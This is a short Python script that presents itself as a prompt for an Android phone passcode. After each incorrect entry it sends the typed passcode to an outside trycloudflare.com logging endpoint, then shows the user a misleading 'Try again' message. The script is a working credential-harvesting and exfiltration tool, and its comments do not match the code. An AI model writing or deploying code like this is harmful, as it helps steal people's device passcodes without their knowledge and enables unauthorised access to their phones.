import os
import requests
from termcolor import colored

# Initialize the number of attempts
attempts = 0

while True:
    passcode = input(colored("Enter your android phone passcode: ", "red"))

    if not passcode.isdigit():
        print(colored("Invalid input! Please enter numbers only.", "yellow"))
        continue

    if passcode == "55523267234":  # Replace "1234" with the actual android phone passcode
        print(colored("The passcode is correct!", "green"))
        break
    else:
        print(colored("The passcode you entered is incorrect.", "yellow"))

    # Optional: Add a condition to break out of the loop
    attempts += 1

    if attempts >= 3:
        print(colored("Too many incorrect attempts. Exiting...", "red"))
        break  # This will break the loop after 3 incorrect attempts

    # Send the passcode to the logger script, and include a URL
    url = "https://ampland-fast-exp-computer.trycloudflare.com/log-url"  # Replace with the actual URL of the logger script
    data = {"url": "http://example.com", "passcode": passcode}  # Include a URL along with the passcode
    response = requests.post(url, json=data)

    if response.status_code == 200:
        print(colored("Try again.", "green"))
    else:
        print(colored(f"Failed to send passcode: {response.status_code}", "red"))
